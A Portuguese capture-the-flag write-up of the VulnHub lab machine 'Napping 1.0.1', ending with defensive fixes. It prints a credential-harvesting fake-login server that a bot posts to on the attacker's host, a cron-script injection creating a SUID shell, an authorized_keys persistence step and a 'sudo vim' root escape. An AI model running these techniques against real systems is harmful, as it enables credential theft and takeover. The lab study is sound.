VulnHub — Napping 1.0.1

VulnHub · público INTERMEDIÁRIO phishing (admin bot)reverse tabnabbingreuso de credencialcron writablesudo GTFOBins

resumo

Máquina Linux (Ubuntu 20.04) cujo diferencial é o vetor inicial: a aplicação deixa qualquer um submeter um link "para o admin revisar", e o admin é um bot headless que visita o link e preenche login. Explorei isso com uma página de login falsa para capturar as credenciais do admin. Daí, reuso de senha (config.php) → SSH, um script de cron gravável e um sudo vim levaram a root.

Formulário "Blog Link" (admin bot visita o link submetido)
        │  página de login falsa hospedada pelo atacante
        ▼
Bot envia credenciais → capturadas (phishing)
        │
        ▼
config.php vaza creds  ──►  reuso de senha  ──►  SSH (daniel)
        │
        ▼
/home/adrian/query.py gravável + cron 2min  ──►  vira adrian
        │
        ▼
sudo NOPASSWD /usr/bin/vim (GTFOBins)  ──►  ROOT

fase 1 — reconhecimento

arp-scan -l                       # descobre o IP na rede host-only
nmap -Pn -n -sV -A 192.168.56.103

Duas portas: 22 (OpenSSH 8.2p1) e 80 (Apache 2.4.41, app PHP com submissão de links). A aplicação reflete o parâmetro url de volta no HTML — provei XSS armazenado, mas o admin é headless e não carrega cookie de sessão, então roubo de cookie não leva a nada. O caminho real é outro.

fase 2 — ataque web: phishing via admin bot

Mecanismo (o coração da box): o formulário aceita um link externo sem validar domínio (sem whitelist), e um cliente privilegiado automatizado (o "admin") visita esse link e digita suas credenciais em qualquer formulário de login que encontrar. Isso é a combinação de duas falhas: ausência de validação de destino (open redirect / link externo) + um bot que autentica cegamente. A técnica original da máquina é o reverse tabnabbing (window.opener) — testei —, mas o que capturou a senha de fato foi simplesmente apontar o bot para uma réplica da página de login.

Montei um servidor HTTP em Python (no Kali) que serve a página falsa, captura o POST e redireciona o bot de volta ao site real (para não levantar suspeita):

# catcher.py (essência) — serve o login falso e loga as credenciais do POST
def do_POST(self):
    n = int(self.headers['Content-Length'])
    dados = urllib.parse.parse_qs(self.rfile.read(n).decode())
    print("CAPTURADO:", dados.get('username'), dados.get('password'))
    self.send_response(302)                       # redireciona de volta ao alvo
    self.send_header("Location", "http://192.168.56.103/welcome.php")
    self.end_headers()
# no campo "Blog Link" do alvo, submeti:
http://192.168.56.102/index.html
# o bot visitou, preencheu e enviou:
#   usuário:daniel
#   senha:C@ughtm3napping123

fase 3 — acesso inicial (reuso de credencial)

Enumerando a aplicação, o /var/www/html/config.php expôs credenciais do banco em texto claro:

adrian : P@sswr0d456          # CWE-798 (credencial hard-coded)

A senha estava reutilizada no SO — login SSH como daniel (mesmo grupo administrators do adrian). Credencial de aplicação virou acesso ao sistema (CWE-522).

fase 4 — privesc daniel → adrian (cron writable)

O LinPEAS apontou um script no home do adrian, executado por cron a cada 2 minutos, gravável pelo grupo administrators:

*/2 * * * * /usr/bin/python3 /home/adrian/query.py

Mecanismo: quem tem privilégio menor (grupo administrators) pode escrever um arquivo que um processo de maior privilégio (cron do adrian) executa — quebra de fronteira de confiança (CWE-732). Acrescentei uma linha ao script para, na próxima execução, criar um bash SUID de propriedade do adrian:

echo 'import os; os.system("cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash")' >> /home/adrian/query.py
# após o cron: /tmp/rootbash -p  → euid=1000(adrian)

Para persistir o acesso, injetei uma chave pública no authorized_keys do adrian e passei a logar direto por SSH como adrian.

fase 5 — privesc adrian → root (sudo vim)

sudo -l
# (root) NOPASSWD: /usr/bin/vim

Mecanismo: o Vim rodando como root via sudo permite escape para shell (GTFOBins). Editores e interpretadores (vim, nano, python, perl) liberados no sudoers são root instantâneo — porque executam comando arbitrário do SO no contexto em que rodam (CWE-250, privilégio excessivo).

sudo vim -c ':!/bin/sh'
# id → uid=0(root)

flags

user.txt (/home/adrian) : You are nearly there!
root.txt (/root)        : Admins just can't stay awake tsk tsk tsk

o que quebraria a cadeia (defesa)

  • Web: validar o destino do link por whitelist de domínio; não ter um bot que autentica em páginas arbitrárias.
  • Cron: /home/adrian/query.py deveria ser 700 ou pertencer ao root — nunca gravável por grupo.
  • Sudo: remover NOPASSWD para vim; nunca liberar editores/interpretadores via sudo (GTFOBins).
  • Segredos: tirar credenciais do config.php; não reutilizar senha de banco no SO.
